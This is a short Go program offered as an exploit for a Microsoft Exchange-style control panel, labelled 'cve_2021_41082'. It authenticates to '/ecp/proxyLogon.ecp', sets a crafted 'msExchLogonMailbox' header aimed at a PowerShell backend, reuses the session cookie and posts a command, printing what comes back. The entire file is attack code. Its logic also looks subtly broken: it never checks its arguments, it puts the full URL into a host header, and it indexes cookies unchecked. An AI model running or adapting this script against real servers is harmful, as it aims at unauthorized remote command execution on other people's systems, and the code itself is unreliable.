package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	fmt.Println("Usage: ./cve_2021_41082 url username password")
	url := os.Args[1]
	username := os.Args[2]
	password := os.Args[3]

	command := "whoami"
	req, err := http.NewRequest("POST", url+"/ecp/proxyLogon.ecp", nil)
	if err != nil {
		panic(err)
	}
	req.Header.Set("msExchLogonMailbox", fmt.Sprintf("Admin@%s:444/ecp/DDI/DDIService.svc/PowerShell?X-Rps-CAT=", url))

	req.SetBasicAuth(username, password)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	sessionID := resp.Cookies()[0].Value
	if sessionID == "" {
		fmt.Println("[-] Failed to get ASP.NET_SessionId")
	}

	fmt.Println("[+] Got ASP.NET_SessionId:", sessionID)

	req2, err := http.NewRequest("POST", url+"/ecp/proxyLogon.ecp", strings.NewReader(command))
	if err != nil {
		panic(err)
	}
	req2.Header.Set("msExchLogonMailbox", fmt.Sprintf("%s:444/ecp/DDI/DDIService.svc/PowerShell?X-Rps-CAT=", url))

	req2.AddCookie(&http.Cookie{Name: "ASP.NET_SessionId", Value: sessionID})

	resp2, err := client.Do(req2)
	if err != nil {
		panic(err)
	}
	defer resp2.Body.Close()
	body2, err := ioutil.ReadAll(resp2.Body)
	if err != nil {
		panic(err)
	}
	fmt.Println("[+] The target might vulnerable.")
	fmt.Println("Command output:", string(body2))
}
